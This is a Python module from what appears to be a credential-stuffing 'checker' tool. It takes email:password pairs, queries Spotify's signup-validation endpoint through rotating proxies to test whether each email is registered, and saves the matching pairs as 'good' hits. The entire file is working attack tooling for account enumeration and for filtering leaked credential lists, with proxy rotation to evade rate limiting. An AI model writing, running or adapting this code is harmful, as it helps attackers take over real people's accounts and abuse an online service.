from __main__ import checker
from requests import get
from modules.functions import bad_proxy, log,save,set_proxy

def check(email:str,password:str):
    retries = 0
    while retries != checker.retries:
        proxy = set_proxy()
        try:
            r = get(f"https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email={email}",proxies=set_proxy(proxy),timeout=checker.timeout).text
            if "That email is already registered to an account." in r:
                if not checker.cui:
                    log("good",email,"SpotifyVM")
                save("SpotifyVM","good",checker.time,email+":"+password)
                checker.good += 1
                checker.cpm += 1
                return
            elif "Enter your email to continue." in r or "status\":1" in r:
                retries += 1
            else:
                raise
        except:
            bad_proxy(proxy)
            checker.errors += 1
    if not checker.cui:
        log("bad",email,"SpotifyVM")
    checker.bad += 1
    checker.cpm += 1
    return